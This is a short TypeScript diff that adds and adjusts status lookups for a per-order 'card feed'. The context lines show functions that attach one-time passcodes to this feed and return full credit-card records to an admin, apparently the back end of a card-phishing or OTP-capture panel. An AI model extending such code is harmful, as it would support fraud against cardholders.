@@ -181,14 +181,22 @@ export async function attachOtpToCardFeed(orderRef: string, otp: string): Promis
   return true;
 }
 
-export async function updateCardFeedStatus(orderRef: string, status: string): Promise<void> {
+export async function updateCardFeedStatus(orderRef: string, status: string): Promise<boolean> {
   const ref = String(orderRef || "").trim();
-  if (!ref) return;
+  if (!ref) return false;
   const feed = loadFeedRaw();
   const ix = feed.findIndex((e) => e.order_ref === ref);
-  if (ix < 0) return;
+  if (ix < 0) return false;
   feed[ix] = { ...feed[ix], status, updated_at: new Date().toISOString() };
   saveFeed(feed);
+  return true;
+}
+
+export async function getCardFeedStatus(orderRef: string): Promise<string | null> {
+  const ref = String(orderRef || "").trim();
+  if (!ref) return null;
+  const row = loadFeedRaw().find((e) => e.order_ref === ref);
+  return row?.status ? String(row.status) : null;
 }
 
 export async function getCreditCardByOrderRef(orderRef: string): Promise<AdminCardPayload | null> {
